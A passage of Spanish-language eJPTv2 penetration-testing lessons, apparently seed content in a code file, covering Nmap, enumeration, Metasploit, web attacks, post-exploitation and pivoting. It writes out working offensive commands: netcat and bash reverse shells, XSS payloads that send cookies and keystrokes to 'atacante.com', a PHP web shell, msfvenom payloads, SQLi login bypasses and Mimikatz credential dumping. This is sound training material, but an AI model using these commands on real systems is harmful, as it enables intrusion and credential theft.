### Estrategia de tiempo (48 horas)

```
Horas 1-3:   Reconocimiento completo de toda la red
              → nmap a todos los rangos de red
              → anota todos los servicios y versiones

Horas 3-10:  Explotación de las máquinas más vulnerables
              → busca exploits para cada versión de servicio
              → Metasploit primero, manual si falla

Horas 10-20: Máquinas más complejas + pivoting
              → usa las credenciales/shells obtenidas para pivotar

Horas 20-40: Afilar respuestas + máquinas pendientes

Horas 40-48: Buffer / revisión final
```

---

## Herramientas que debes dominar para el eJPTv2

| Herramienta | Para qué | Imprescindible |
|------------|---------|----------------|
| Nmap | Escaneo de red | ✅ |
| Metasploit | Explotación | ✅ |
| Meterpreter | Post-explotación | ✅ |
| Netcat | Shells, pivoting | ✅ |
| Gobuster/ffuf | Fuzzing web | ✅ |
| sqlmap | SQLi automatizado | ✅ |
| Hydra | Brute force | ✅ |
| Burp Suite | Proxy web | ⭐ |
| enum4linux | SMB | ⭐ |
| smbclient | SMB | ⭐ |

---

## Recursos de estudio recomendados

```
GRATIS:
  TryHackMe:
    - "Jr Penetration Tester" learning path
    - Room "Blue" (EternalBlue)
    - Room "Metasploit"
    - Room "OWASP Top 10"
    - Room "Nmap"

  HackTheBox Starting Point:
    - Máquinas: Meow, Fawn, Dancing, Redeemer

DE PAGO:
  INE Starter Pass:
    - Curso oficial "Penetration Testing Student"
    - Incluye el voucher del examen
```

---

> 💡 **Consejo:** El eJPTv2 no requiere exploits manuales complejos. El 90% se resuelve con Metasploit + Nmap + sentido común. Si llevas 2 horas en una máquina sin avance, déjala y pasa a la siguiente.
""",
    },
    {
        "title": "Redes para Pentesters: TCP/IP, Nmap y Wireshark",
        "slug": "ejptv2-redes-fundamentales",
        "order_index": 1,
        "content": """\
# Redes para Pentesters: TCP/IP, Nmap y Wireshark

## Por qué un pentester necesita saber redes

Entender TCP/IP no es opcional — es la base de todo. Necesitas saber cómo funciona el tráfico para capturarlo, analizarlo y explotarlo.

---

## Modelo TCP/IP para Pentesters

```
Capa 4 — Aplicación:  HTTP, FTP, SSH, SMB, DNS
Capa 3 — Transporte:  TCP (fiable), UDP (rápido)
Capa 2 — Internet:    IP, ICMP, ARP
Capa 1 — Red:         Ethernet, WiFi
```

### Protocolo TCP — 3-Way Handshake

```
Cliente          Servidor
   |  ──SYN──→      |    Puerto ABIERTO: responde SYN-ACK
   |  ←SYN-ACK──    |
   |  ──ACK──→      |    Conexión establecida

   |  ──SYN──→      |    Puerto CERRADO: responde RST
   |  ←RST──────    |

   |  ──SYN──→      |    Puerto FILTRADO: no responde (firewall)
   |  (timeout)     |
```

Esto es lo que Nmap aprovecha para sus escaneos.

---

## Direccionamiento IP

```bash
# Notación CIDR
192.168.1.0/24   → 254 hosts (192.168.1.1 - 192.168.1.254)
10.10.10.0/28    → 14 hosts
172.16.0.0/16    → 65534 hosts

# Ver mi configuración de red
ip addr show
ip route show
cat /etc/resolv.conf   # DNS

# Calcular rangos de red
ipcalc 192.168.1.0/24
```

---

## Nmap — Referencia completa

### Descubrimiento de hosts

```bash
# Ping sweep (sin escaneo de puertos)
nmap -sn 192.168.1.0/24

# ARP scan (más fiable en LAN)
sudo nmap -PR 192.168.1.0/24

# Sin resolución DNS (más rápido)
nmap -sn -n 192.168.1.0/24

# Desde lista de IPs
nmap -sn -iL hosts.txt
```

### Escaneos de puertos

```bash
# TCP SYN Scan (stealth, más común)
sudo nmap -sS 192.168.1.100

# TCP Connect (sin root, más lento)
nmap -sT 192.168.1.100

# UDP Scan (lento pero importante: DNS 53, SNMP 161, TFTP 69)
sudo nmap -sU --top-ports 100 192.168.1.100

# Todos los puertos
nmap -p- 192.168.1.100 --min-rate=5000

# Puertos específicos
nmap -p 22,80,443,8080,8443 192.168.1.100

# Top 1000 puertos (default)
nmap 192.168.1.100
```

### Detección de servicios y OS

```bash
# Detección de versiones
nmap -sV 192.168.1.100

# Intensidad de detección (0-9, default 7)
nmap -sV --version-intensity 9 192.168.1.100

# Detección de OS (requiere root)
sudo nmap -O 192.168.1.100

# Todo junto — escaneo completo pentesting
sudo nmap -sS -sV -sC -O -p- --min-rate=5000 -oA resultado 192.168.1.100
```

### Scripts NSE

```bash
# Scripts por defecto (-sC equivale a --script=default)
nmap -sC 192.168.1.100

# Scripts específicos
nmap --script http-enum 192.168.1.100
nmap --script smb-vuln-ms17-010 192.168.1.100
nmap --script ftp-anon,ftp-bounce 192.168.1.100
nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.100

# Todos los scripts de vulnerabilidades
nmap --script vuln 192.168.1.100

# Ver scripts disponibles
ls /usr/share/nmap/scripts/ | grep smb
```

### Formatos de salida

```bash
nmap -oN resultado.txt     # texto normal
nmap -oX resultado.xml     # XML (importable en Metasploit)
nmap -oG resultado.gnmap   # grepable
nmap -oA resultado          # los 3 a la vez
```

---

## Wireshark — Análisis de Tráfico

### Filtros de captura (antes de capturar)

```
host 192.168.1.100            captura solo tráfico de esa IP
port 80                        solo HTTP
net 192.168.1.0/24             toda la subred
not arp                        excluir ARP
tcp port 443                   solo HTTPS
```

### Filtros de display (después de capturar)

```
ip.addr == 192.168.1.100       tráfico hacia/desde IP
ip.src == 192.168.1.100        solo origen
tcp.port == 4444               puerto específico (¿reverse shell?)
http.request.method == "POST"  formularios POST
dns                            solo DNS
ftp                            solo FTP
tcp.flags.syn == 1             paquetes SYN (inicio de conexión)
frame contains "password"      buscar string en paquetes
```

### Análisis forense con Wireshark

```bash
# Exportar objetos HTTP (archivos descargados)
File → Export Objects → HTTP

# Seguir una conversación TCP completa
clic derecho en paquete → Follow → TCP Stream

# Estadísticas
Statistics → Conversations → TCP (ver top conexiones)
Statistics → HTTP → Requests

# Comandos útiles desde terminal
tshark -r captura.pcap -Y "http.request" -T fields -e ip.src -e http.request.uri
```

---

## Pivoting — Acceder a redes internas

Una vez comprometida una máquina que tiene acceso a otra red interna:

```bash
# En Metasploit — route add
# (desde una sesión Meterpreter activa)
msf > route add 10.10.10.0/24 1    # 1 = session ID

# SOCKS proxy con Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -p 22,80 10.10.10.5

# SSH tunneling
# Forward: acceder a puerto remoto via SSH
ssh -L 8080:10.10.10.5:80 usuario@192.168.1.100

# Dynamic: proxy SOCKS via SSH
ssh -D 1080 usuario@192.168.1.100
```

---

> 💡 **Tip eJPTv2:** El examen SIEMPRE tiene pivoting. Cuando comprometas la primera máquina, ejecuta `ifconfig` / `ip addr` — si tiene más de una interfaz de red, hay otra subred que explorar. Configura route en Metasploit inmediatamente.
""",
    },
    {
        "title": "Enumeración y Reconocimiento: Nmap, Gobuster y Netcat",
        "slug": "ejptv2-enumeracion-reconocimiento",
        "order_index": 2,
        "content": """\
# Enumeración y Reconocimiento: Nmap, Gobuster y Netcat

## Reconocimiento Pasivo vs Activo

| | Pasivo | Activo |
|---|---|---|
| **Qué es** | Sin contacto directo con el objetivo | Interacción directa |
| **Detectable** | No | Sí (aparece en logs) |
| **Ejemplos** | OSINT, WHOIS, Shodan | Nmap, Gobuster, Netcat |

---

## OSINT — Reconocimiento Pasivo

```bash
# WHOIS — registrante del dominio
whois target.com

# DNS — registros del dominio
dig target.com A       # IPs del dominio
dig target.com MX      # servidores de correo
dig target.com NS      # servidores DNS
dig target.com ANY     # todos los registros

# Transferencia de zona DNS (si mal configurado)
dig axfr @ns1.target.com target.com

# Subdominios con dnsx
subfinder -d target.com | dnsx -silent

# theHarvester — emails, subdominios, IPs
theHarvester -d target.com -b google,bing,linkedin,certspotter
```

---

## Enumeración Web

### Gobuster

```bash
# Fuerza bruta de directorios
gobuster dir \
  -u http://192.168.1.100 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 50

# Subdominios
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Vhosts
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### ffuf — Fuzzer alternativo

```bash
# Directorios
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.100/FUZZ

# Parámetros GET
ffuf -w params.txt -u http://192.168.1.100/page.php?FUZZ=valor

# Login brute force
ffuf -w passwords.txt -u http://192.168.1.100/login \
  -X POST -d "user=admin&pass=FUZZ" \
  -fc 302   # filtrar redirecciones (login fallido)
```

---

## Enumeración SMB (Puerto 445/139)

SMB es uno de los vectores más comunes en redes Windows.

```bash
# Ver shares disponibles
smbclient -L //192.168.1.100 -N       # sin contraseña
smbclient -L //192.168.1.100 -U admin

# Conectar a un share
smbclient //192.168.1.100/share -N
smb: \> ls
smb: \> get archivo.txt
smb: \> put malware.exe

# enum4linux — enumeración completa SMB
enum4linux -a 192.168.1.100
enum4linux -u admin -p password 192.168.1.100

# CrackMapExec — enumeración SMB avanzada
crackmapexec smb 192.168.1.0/24        # descubrir hosts SMB
crackmapexec smb 192.168.1.100 -u admin -p password --shares
crackmapexec smb 192.168.1.100 -u admin -p password --sam   # dump SAM
```

---

## Enumeración FTP (Puerto 21)

```bash
# Login anónimo
ftp 192.168.1.100
# Usuario: anonymous
# Contraseña: (vacío o email)

# Con Netcat
nc 192.168.1.100 21   # ver banner → version del FTP

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst 192.168.1.100

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
```

---

## Enumeración SSH (Puerto 22)

```bash
# Ver versión (información sobre SO)
nc 192.168.1.100 22    # banner: "SSH-2.0-OpenSSH_7.9p1 Debian"

# Brute force SSH
hydra -l root -P rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P passes.txt ssh://192.168.1.100 -t 4

# Medusa (alternativa a Hydra)
medusa -h 192.168.1.100 -u root -P rockyou.txt -M ssh
```

---

## Enumeración HTTP/HTTPS (Puerto 80/443)

```bash
# Ver headers del servidor
curl -I http://192.168.1.100
curl -I https://192.168.1.100 -k   # -k = ignorar cert inválido

# Nikto — scanner web básico
nikto -h http://192.168.1.100
nikto -h http://192.168.1.100 -output nikto_result.txt

# Ver código fuente (a veces tiene comentarios con rutas/passwords)
curl http://192.168.1.100 | grep -E "password|pass|admin|TODO|FIXME|<!--"

# robots.txt y sitemap
curl http://192.168.1.100/robots.txt
curl http://192.168.1.100/sitemap.xml
```

---

## Netcat — La Navaja Suiza

```bash
# Banner grabbing (ver versión del servicio)
nc 192.168.1.100 80
HEAD / HTTP/1.0
(Enter dos veces)

nc 192.168.1.100 25    # SMTP
nc 192.168.1.100 110   # POP3
nc 192.168.1.100 21    # FTP

# Escuchar en puerto (listener)
nc -lvnp 4444

# Conectar a listener
nc 192.168.1.50 4444

# Transferir archivo
# Receptor:
nc -lvnp 4444 > archivo_recibido.txt
# Emisor:
nc 192.168.1.50 4444 < archivo_a_enviar.txt

# Shell reversa con Netcat
# Atacante (escucha):
nc -lvnp 4444
# Víctima Linux:
nc 192.168.1.50 4444 -e /bin/bash
# Víctima Windows:
nc 192.168.1.50 4444 -e cmd.exe

# Shell reversa alternativa (bash)
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
```

---

## Enumeración MySQL (Puerto 3306)

```bash
# Conexión directa
mysql -h 192.168.1.100 -u root -p
mysql -h 192.168.1.100 -u root   # sin contraseña (misconfig común)

# Comandos básicos
show databases;
use nombre_db;
show tables;
select * from users limit 10;
select user, password from mysql.user;   # hashes de usuarios MySQL
```

---

> 💡 **Workflow eJPTv2:** Nmap completo primero → anota cada servicio y versión → enumera cada servicio → busca credenciales por defecto → busca exploits con searchsploit. Para web: siempre Gobuster + Nikto + revisar robots.txt y código fuente.
""",
    },
    {
        "title": "Metasploit Framework: Explotación de Sistemas",
        "slug": "ejptv2-metasploit-explotacion",
        "order_index": 3,
        "content": """\
# Metasploit Framework: Explotación de Sistemas

## Arquitectura de Metasploit

```
msfconsole
├── Exploits       Código que aprovecha una vulnerabilidad
├── Payloads       Lo que se ejecuta tras explotar
│   ├── Singles    Payload todo en uno (pequeños, menos funcionalidad)
│   ├── Stagers    Descargan el Stage (muy pequeños)
│   └── Stages     Funcionalidad completa (Meterpreter, Shell)
├── Auxiliares     Escaneo, fuerza bruta, fuzzing
├── Post           Post-explotación (hashdump, pivoting, etc.)
├── Encoders       Ofuscan payloads para evadir AV
└── NOPs           Relleno para buffer overflows
```

---

## Comandos Esenciales de msfconsole

```bash
# Iniciar Metasploit
msfconsole
msfconsole -q    # sin banner (más rápido)

# Buscar módulos
msf > search eternalblue
msf > search type:exploit platform:windows smb
msf > search cve:2017-0144
msf > search vsftpd

# Usar un módulo
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > use 0    # usar resultado por número

# Información del módulo
msf [exploit] > info

# Ver y configurar opciones
msf [exploit] > show options
msf [exploit] > set RHOSTS 192.168.1.100
msf [exploit] > set RPORT 445
msf [exploit] > set LHOST 192.168.1.50
msf [exploit] > set LPORT 4444

# Ver payloads compatibles
msf [exploit] > show payloads

# Seleccionar payload
msf [exploit] > set payload windows/x64/meterpreter/reverse_tcp

# Ejecutar
msf [exploit] > run
msf [exploit] > exploit
msf [exploit] > exploit -j    # en background (job)

# Gestionar sesiones
msf > sessions -l              # listar sesiones activas
msf > sessions -i 1            # interactuar con sesión 1
msf > sessions -k 1            # matar sesión 1

# Historial y ayuda
msf > history
msf > help
```

---

## Exploits Más Comunes en el eJPTv2

### EternalBlue — MS17-010 (Windows SMB)

```bash
# Verificar si es vulnerable
nmap --script smb-vuln-ms17-010 192.168.1.100

# En Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST <tu-IP>
set payload windows/x64/meterpreter/reverse_tcp
run
```

### vsftpd 2.3.4 Backdoor (Linux FTP)

```bash
# Esta versión tiene una backdoor que abre shell en puerto 6200
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
run
# → Obtienes shell de root directamente
```

### UnrealIRCd Backdoor (Linux)

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.100
set payload cmd/unix/reverse_perl
set LHOST <tu-IP>
run
```

### Apache Tomcat Manager (Java)

```bash
# Subir WAR malicioso al manager de Tomcat
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.100
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set payload java/meterpreter/reverse_tcp
set LHOST <tu-IP>
run
```

### Brute Force SSH con Auxiliary

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
set STOP_ON_SUCCESS true
run
```

---

## msfvenom — Generador de Payloads

```bash
# Listar payloads disponibles
msfvenom -l payloads | grep windows

# Payload Windows .exe (reverse shell)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# Payload Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf && chmod +x shell.elf

# PHP reverse shell (para subir a web vulnerable)
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw > shell.php

# ASP (para IIS)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f asp > shell.asp

# Listener para recibir cualquier meterpreter
use exploit/multi/handler
set LHOST 192.168.1.50
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run -j    # en background para no bloquear
```

---

## Meterpreter — Comandos Post-Explotación

```bash
# Información del sistema
meterpreter > sysinfo
meterpreter > getuid          # usuario actual
meterpreter > getpid          # PID del proceso

# Escalar privilegios
meterpreter > getsystem       # intentar SYSTEM en Windows
meterpreter > migrate <PID>   # migrar a otro proceso (más estable)

# Sistema de archivos
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users\\Administrator
meterpreter > download secretos.txt /tmp/
meterpreter > upload payload.exe C:\\Windows\\Temp\\

# Shell interactiva
meterpreter > shell           # abre cmd/bash
# Ctrl+Z para volver a Meterpreter

# Extraer contraseñas (Windows)
meterpreter > hashdump        # hashes SAM
meterpreter > run post/windows/gather/credentials/credential_collector

# Captura de pantalla y keylogger
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Pivoting
meterpreter > run post/multi/manage/shell_to_meterpreter
meterpreter > run autoroute -s 10.10.10.0/24    # añadir ruta
```

---

## Troubleshooting común

```bash
# El exploit falla — posibles causas:
# 1. Arquitectura incorrecta (x86 vs x64)
#    → use payload windows/x64/... o windows/...

# 2. Antivirus bloquea el payload
#    → usar encoder: set EnableStageEncoding true
#    → msfvenom con encoder: msfvenom ... -e x64/xor_dynamic -i 5

# 3. Firewall bloquea el puerto
#    → cambiar LPORT a 443 o 80 (puertos habitualmente abiertos)

# 4. Sesión se cierra enseguida
#    → migrate a un proceso estable: migrate -N explorer.exe

# Verificar conectividad antes del exploit
msf > use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 445
run
```

---

> 💡 **Tip eJPTv2:** Siempre comprueba el arquitectura del objetivo antes de seleccionar el payload. Un Windows 64-bit necesita `windows/x64/...` . Si el exploit falla, prueba el módulo `exploit/multi/handler` con diferentes payloads.
""",
    },
    {
        "title": "Ataques a Aplicaciones Web: SQLi, XSS y más",
        "slug": "ejptv2-ataques-web",
        "order_index": 4,
        "content": """\
# Ataques a Aplicaciones Web: SQLi, XSS y más

## Metodología de Web App Pentesting

```
1. Recon     → tecnologías, subdominios, endpoints
2. Mapping   → crawl, fuzzing, identificar funcionalidades
3. Discovery → buscar vulns en cada funcionalidad
4. Exploit   → PoC, extraer datos, obtener acceso
```

---

## Burp Suite — El Proxy del Pentester

### Configuración

```
1. Abrir Burp Suite Community
2. Proxy → Options → Añadir listener en 127.0.0.1:8080
3. Configurar navegador (o FoxyProxy):
   HTTP Proxy: 127.0.0.1, Puerto: 8080
4. Interceptar: Proxy → Intercept → ON
```

### Herramientas clave

```
Proxy Intercept  → captura y modifica requests en tiempo real
Repeater         → reenviar y modificar requests manualmente
Intruder         → fuzzing/brute force automatizado
Scanner          → (solo Pro) detección automática de vulns
Decoder          → encodear/decodear URL, Base64, HTML...
```

---

## SQL Injection

### Detección manual

```sql
-- En campos de búsqueda o URL: añadir '
http://target.com/item?id=1'

-- Si devuelve error SQL → vulnerable
-- "You have an error in your SQL syntax..."

-- Comentarios SQL para romper la query
' --
' #
'/*

-- Siempre verdadero (bypass login)
' OR '1'='1' --
' OR 1=1 --
admin'--
```

### Extracción de datos (manual)

```sql
-- Determinar número de columnas
' ORDER BY 1 --    → ok
' ORDER BY 2 --    → ok
' ORDER BY 3 --    → error → hay 2 columnas

-- UNION para extraer datos
' UNION SELECT NULL, NULL --
' UNION SELECT username, password FROM users --

-- Obtener versión y base de datos
' UNION SELECT version(), database() --

-- Listar tablas
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --

-- Listar columnas de una tabla
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

### sqlmap — Automatización

```bash
# Básico
sqlmap -u "http://target.com/item?id=1"

# Con datos POST (login form)
sqlmap -u "http://target.com/login" \
  --data="user=test&pass=test" \
  --method POST

# Con cookie de sesión
sqlmap -u "http://target.com/profile" \
  --cookie="session=abc123"

# Extraer bases de datos
sqlmap -u "http://target.com/item?id=1" --dbs

# Extraer tablas de una DB
sqlmap -u "http://target.com/item?id=1" -D nombre_db --tables

# Extraer datos de tabla
sqlmap -u "http://target.com/item?id=1" -D nombre_db -T users --dump

# Shell SQL interactiva
sqlmap -u "http://target.com/item?id=1" --sql-shell

# Os-shell (si es posible)
sqlmap -u "http://target.com/item?id=1" --os-shell
```

---

## Cross-Site Scripting (XSS)

### Tipos

```
Reflected XSS   → payload en URL, ejecutado inmediatamente
Stored XSS      → payload guardado en BD, ejecutado en cada visita
DOM-based XSS   → manipulación del DOM en cliente
```

### Detección y payloads básicos

```html
<!-- Prueba básica -->
<script>alert('XSS')</script>

<!-- Si filtran <script> -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- Bypass de comillas -->
<script>alert`XSS`</script>

<!-- Robar cookies (si no hay HttpOnly) -->
<script>document.location='http://atacante.com/steal?c='+document.cookie</script>

<!-- Keylogger básico -->
<script>document.onkeypress=function(e){
  new Image().src='http://atacante.com/log?k='+e.key
}</script>
```

---

## Directory Traversal / Path Traversal

Acceder a archivos fuera del directorio web.

```bash
# En URL
http://target.com/view?file=../../../../etc/passwd
http://target.com/download?path=../../../etc/shadow

# Con encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    # URL encoded
....//....//etc/passwd                        # doble punto trick
..%252f..%252fetc%252fpasswd                  # double URL encoded

# Objetivos interesantes en Linux
/etc/passwd
/etc/shadow
/home/user/.ssh/id_rsa      # clave privada SSH
/var/www/html/config.php    # credenciales BD
/proc/self/environ          # variables de entorno

# En Windows
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
```

---

## File Upload Vulnerability

```bash
# Subir PHP web shell
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Si solo acepta imágenes — añadir magic bytes
echo -e '\xff\xd8\xff\xe0' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# O cambiar la extensión a variantes
shell.pHP  shell.php5  shell.phtml  shell.php.jpg

# Una vez subido — RCE
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=ls+/
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd

# Reverse shell desde RCE
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.50/4444+0>%261'
```

---

## Autenticación — Ataques Comunes

```bash
# Brute force con Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Default credentials (siempre probar primero)
admin:admin       admin:password    admin:123456
root:root         test:test         guest:guest
admin:(vacío)     administrator:administrator

# Bypass básico SQLi en login
usuario: admin' --
contraseña: (cualquier cosa)
→ Query: SELECT * FROM users WHERE user='admin'--' AND pass='...'
→ Ignora la parte de contraseña
```

---

> 💡 **Tip eJPTv2:** Para web, el flujo es: Gobuster para descubrir rutas → revisar cada formulario buscando SQLi/XSS → probar credenciales por defecto → si hay subida de archivos, intentar subir shell PHP. El examen suele tener al menos una máquina con vulnerabilidad web.
""",
    },
    {
        "title": "Post-Explotación: Meterpreter, Pivoting y Persistencia",
        "slug": "ejptv2-post-explotacion-pivoting",
        "order_index": 5,
        "content": """\
# Post-Explotación: Meterpreter, Pivoting y Persistencia

## ¿Qué es la Post-Explotación?

Una vez obtenido acceso a un sistema, la post-explotación consiste en:
- Escalar privilegios (user → admin/root)
- Extraer credenciales y datos sensibles
- Mantener el acceso (persistencia)
- Moverse a otros sistemas (pivoting)

---

## Meterpreter — Referencia Completa

```bash
# Sistema
meterpreter > sysinfo             # OS, hostname, arquitectura
meterpreter > getuid              # usuario actual: NT AUTHORITY\SYSTEM
meterpreter > getpid              # PID del proceso actual
meterpreter > ps                  # listar todos los procesos

# Archivos
meterpreter > pwd
meterpreter > ls -la
meterpreter > cat /etc/passwd
meterpreter > search -f *.txt -d C:\\Users    # buscar archivos
meterpreter > download /etc/shadow .          # descargar archivo
meterpreter > upload linpeas.sh /tmp/         # subir script

# Shell
meterpreter > shell               # bash/cmd interactivo
# Para volver: Ctrl+Z → background, o 'exit' para cerrar shell

# Migración de proceso (Windows — para estabilidad y privilegios)
meterpreter > ps                  # ver procesos
meterpreter > migrate 1234        # migrar por PID
meterpreter > migrate -N lsass.exe   # migrar a proceso por nombre

# Captura de pantalla
meterpreter > screenshot
meterpreter > screenshare         # stream en tiempo real

# Keylogger
meterpreter > keyscan_start
# (esperar unos minutos)
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

---

## Escalada de Privilegios — Linux

### Vectores comunes

```bash
# 1. sudo -l → comandos que puedes ejecutar como root
sudo -l
# Si aparece: (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'   # → shell de root

# 2. SUID binaries — ejecutan como propietario (root)
find / -perm -4000 -type f 2>/dev/null
# Si aparece /usr/bin/find con SUID:
/usr/bin/find . -exec /bin/sh \; -quit

# Consultar GTFOBins para explotación de cada binario:
# https://gtfobins.github.io/

# 3. Cron jobs como root
cat /etc/crontab
ls /etc/cron.d/
# Si hay script de root editable:
echo 'chmod +s /bin/bash' >> /script_de_root.sh
# Esperar que el cron se ejecute...
bash -p   # shell de root

# 4. Contraseñas en archivos de configuración
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "config.php" 2>/dev/null
grep -r "DB_PASSWORD\|password\s*=" /var/www/ 2>/dev/null

# 5. Scripts de automatización
# LinPEAS — auditoria completa de privesc
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# O subir con Meterpreter:
upload linpeas.sh /tmp/linpeas.sh
shell
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

---

## Escalada de Privilegios — Windows

```bash
# En Meterpreter
meterpreter > getsystem          # intentar SYSTEM automáticamente
meterpreter > run post/multi/recon/local_exploit_suggester  # sugerir exploits

# Comandos en shell Windows
whoami /all                      # usuario, grupos, privilegios
net user                         # usuarios del sistema
net localgroup administrators    # miembros del grupo admin
systeminfo                       # info del SO + hotfixes instalados

# WinPEAS — equivalente a LinPEAS para Windows
upload winpeas.exe C:\\Windows\\Temp\\winpeas.exe
shell
C:\\Windows\\Temp\\winpeas.exe

# Verificar versión y buscar exploits
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# Buscar en: https://www.exploit-db.com/search?q=windows+<version>
```

---

## Extracción de Credenciales

### Linux

```bash
# Hashes de contraseñas
cat /etc/shadow
# Formato: usuario:$6$salt$hash:...
# $6$ = SHA-512, $1$ = MD5, $y$ = yescrypt

# Crackear con John
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --show   # ver crackeados

# Historial de bash (a veces tiene contraseñas)
cat ~/.bash_history
find / -name ".bash_history" 2>/dev/null | xargs cat

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

### Windows

```bash
# En Meterpreter
meterpreter > hashdump            # hashes SAM (requiere SYSTEM)

# Mimikatz desde Meterpreter
meterpreter > load kiwi
meterpreter > creds_all           # contraseñas en texto claro si posible
meterpreter > lsa_dump_sam        # hashes SAM
meterpreter > lsa_dump_secrets    # secretos LSA

# Pass-The-Hash (usar hash directamente sin crackear)
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:hash_aqui   # LM:NTLM
run
```

---

## Pivoting — Acceso a Subredes Internas

```bash
# Identificar que hay más redes (ejecutar en la máquina comprometida)
# Linux:
ip addr show
ip route show
# Windows:
ipconfig /all

# Si hay interfaz 10.10.10.x → hay subred interna 10.10.10.0/24

# MÉTODO 1: Metasploit autoroute
meterpreter > run post/multi/manage/autoroute
# o manual:
meterpreter > run autoroute -s 10.10.10.0/24
msf > route print   # verificar rutas añadidas

# Escanear la red interna a través del pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445,3389
run

# MÉTODO 2: SOCKS proxy con Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Usar proxychains para llegar a red interna
proxychains nmap -sT -p 80,443,22 10.10.10.5
proxychains curl http://10.10.10.5
proxychains ssh usuario@10.10.10.5

# MÉTODO 3: SSH tunneling (si tienes acceso SSH)
# Dynamic SOCKS proxy:
ssh -D 1080 -N -f usuario@pivot_ip
# Forward de puerto específico:
ssh -L 8080:target_interno:80 usuario@pivot_ip
```

---

> 💡 **Tip eJPTv2:** Cuando comprometas una máquina, SIEMPRE ejecuta `ip addr` / `ipconfig`. Si tiene múltiples interfaces, configura autoroute inmediatamente. El examen diseña la red para que necesites al menos un salto de pivoting.
""",
    },
    {
        "title": "Informe de Pentesting Profesional y Preparación al Examen",
        "slug": "ejptv2-informe-pentesting",
        "order_index": 6,
        "content": """\
# Informe de Pentesting Profesional y Preparación al Examen

## Estructura de un Informe de Pentesting

Un buen informe es la diferencia entre un pentest amateur y uno profesional. Tiene dos audiencias:
1. **Dirección** → resumen ejecutivo (sin tecnicismos)
2. **Técnicos** → hallazgos detallados con pasos de reproducción

---

## Plantilla de Informe

```
1. PORTADA
   - Título, cliente, fecha, clasificación (CONFIDENCIAL)
   - Versión del documento, autores

2. RESUMEN EJECUTIVO (1-2 páginas)
   - Alcance del pentesting
   - Resumen de hallazgos por criticidad
   - Riesgo global (Crítico/Alto/Medio/Bajo)
   - Top 3 recomendaciones prioritarias

3. ÍNDICE

4. ALCANCE Y METODOLOGÍA
   - IPs/dominios en scope
   - Metodología usada (PTES, OWASP, OSSTMM)
   - Herramientas utilizadas
   - Fecha y ventana de tiempo del test

5. HALLAZGOS (una sección por vulnerabilidad)
   - ID, nombre, clasificación CVSS
   - Descripción técnica
   - Evidencia (capturas, comandos, output)
   - Pasos de reproducción
   - Impacto potencial
   - Recomendación de remediación

6. APÉNDICES
